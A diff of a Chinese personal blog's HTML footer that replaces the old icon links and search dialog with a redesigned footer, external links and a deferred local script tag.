-  <div class="shell footer-inner">
-    <p>© 2025–2026 卷毛肖恩 · 个人博客</p>
-    <div class="social-links">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener" aria-label="GitHub"><i class="fa-brands fa-github"></i></a>
-      <a href="mailto:5345414e@gmail.com" aria-label="邮件"><i class="fa-solid fa-envelope"></i></a>
-      <a href="/atom.xml" aria-label="RSS"><i class="fa-solid fa-rss"></i></a>
+  <div class="frame site-footer__inner">
+    <div class="site-footer__identity">
+      <a href="/">CURLYSEAN</a>
+      <span>持续记录，保持验证。</span>
     </div>
+    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <nav class="site-footer__links" aria-label="外部链接">
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="mailto:5345414e@gmail.com">Email ↗</a>
+    </nav>
   </div>
 </footer>
+<button class="back-to-top" type="button" aria-label="返回顶部" data-back-to-top>↑</button>
+<script src="/js/main.js" defer></script>
 
-  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索" hidden>
-  <div class="search-dialog">
-    <button class="search-close icon-button" type="button" aria-label="关闭搜索"><i class="fa-solid fa-xmark"></i></button>
-    <label for="site-search">搜索文章</label>
-    <div class="search-input-wrap"><i class="fa-solid fa-magnifying-glass"></i><input id="site-search" type="search" placeholder="输入标题、标签或正文关键词…" autocomplete="off"></div>
-    <p class="search-hint">按 ESC 关闭 · 输入至少 2 个字符</p>
-    <div class="search-results" aria-live="polite"></div>
-  </div>
-</div>
-
-  <button class="back-to-top" type="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up"></i></button>
-  <script src="/js/main.js"></script>
 </body>
 </html>
